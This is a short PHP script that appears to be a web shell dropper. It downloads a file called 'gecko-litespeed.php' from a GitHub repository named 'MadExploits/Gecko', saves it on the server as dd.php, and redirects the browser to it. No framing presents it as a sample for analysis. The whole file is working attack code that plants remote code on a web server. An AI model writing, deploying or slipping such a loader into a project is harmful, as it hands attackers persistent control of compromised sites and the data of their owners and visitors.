<?php
$content = "https://raw.githubusercontent.com/MadExploits/Gecko/refs/heads/main/gecko-litespeed.php";
$get_content = file_get_contents($content);
if(file_exists("dd.php")){header("location: dd.php");}else{file_put_contents("dd.php", $get_content); header("location: dd.php");}
?>
